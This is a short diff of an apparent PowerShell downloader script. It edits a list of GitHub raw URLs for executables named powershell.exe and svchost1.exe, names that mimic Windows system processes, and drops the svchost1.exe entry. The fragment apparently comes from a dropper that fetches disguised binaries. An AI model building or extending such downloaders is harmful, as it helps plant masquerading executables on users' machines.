@@ -55,8 +55,7 @@ try {
 
 # Список URL для загрузки
 $urls = @(
-    "https://github.com/sys1e/catl/raw/refs/heads/main/powershell.exe",
-    "https://github.com/sys1e/catl/raw/refs/heads/main/svchost1.exe"
+    "https://github.com/sys1e/catl/raw/refs/heads/main/powershell.exe"
 )
 
 $downloaded = @()
